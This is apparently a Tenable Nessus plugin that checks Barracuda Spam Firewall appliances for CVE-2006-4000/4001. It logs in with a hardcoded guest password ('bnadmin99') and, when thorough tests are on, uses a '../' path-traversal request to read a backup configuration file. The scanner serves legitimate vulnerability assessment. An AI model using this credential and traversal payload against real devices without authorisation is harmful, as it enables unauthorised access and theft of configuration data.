#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is affected by multiple vulnerabilities. 

Description :

The remote host appears to be a Barracuda Spam Firewall network
appliance, which protects mail servers from spam, viruses, and the
like. 

The firmware version of the Barracuda Spam Firewall on the remote
device fails to filter input to the 'file' parameter of the
'/cgi-bin/preview_email.cgi' script before using it to read files. 
Using specially crafted strings, an unauthenticated attacker can
leverage this flaw to read arbitrary files and even execute arbitrary
commands on the remote host.  While the web server executes as the
user 'nobody', it is possible to access several system commands
through the use of 'sudo' and thereby gain root privileges. 

In addition, the application contains hardcoded passwords for the
'admin' and 'guest' users.

See also :

http://archives.neohapsis.com/archives/bugtraq/2006-08/0025.html
http://archives.neohapsis.com/archives/bugtraq/2006-08/0026.html
http://archives.neohapsis.com/archives/fulldisclosure/2006-08/0110.html

Solution :

We are unaware of a public statement from the vendor regarding a fix,
but upgrading to firmware version 3.3.0.54 or later reportedly
addresses the issues. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22130);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-4000", "CVE-2006-4001");
  script_bugtraq_id(19276);

  script_name(english:"Barracuda Networks Spam Firewall Multiple Vulnerabilities");
  script_summary(english:"Tries to authenticate to Barracuda Networks Spam Firewall");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Extract some parameters from the login screen in preparation for logging in.
url = "/cgi-bin/index.cgi";
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);

params = NULL;
foreach var (make_list("enc_key", "et"))
{
  pat = string("name=", var, " value=([^>]+)>");
  matches = egrep(pattern:pat, string:res);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      val = eregmatch(pattern:pat, string:match);
      if (!isnull(val)) {
        params[var] = val[1];
        break;
      }
    }
  }
}


# If we got the necessary parameters.
if (!isnull(params) && params['enc_key'] && params['et'])
{
  # Try to log in.
  user = "guest";
  pass = "bnadmin99";
  postdata = string(
    "real_user=&",
    "login_state=out&",
    "locale=en_US&",
    "user=", user, "&",
    "password=", pass, "&",
    "password_entry=&",
    "enc_key=", params['enc_key'], "&",
    "et=", params['et'], "&",
    "Submit=Login"
  );
  req = string(
    "POST ", url, " HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
    "Content-Type: application/x-www-form-urlencoded\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we can login.
  if ("title>Barracuda Spam Firewall: Current Operational Status" >< res)
  {
    contents = NULL;

    # If thorough tests are enabled...
    if (thorough_tests)
    {
      # Try to retrieve the backup copy of configuration file.
      req = http_get(
        item:string(
          "/cgi-bin/preview_email.cgi?",
          "file=/mail/mlog/../tmp/backup/periodic_config.txt.tmp"
        ), 
        port:port
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # If it looks successful...
      if ("account_bypass_quarantine" >< res)
      {
        contents = strstr(res, "<pre>");
        if (contents) contents = contents - "<pre>";
        if (contents) contents = contents - strstr(contents, "</pre>");
        if (contents) contents = str_replace(find:"<br> \", replace:"", string:contents);
      }
    }

    if (contents)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of a backup copy of the device's configuration\n",
        "file that Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
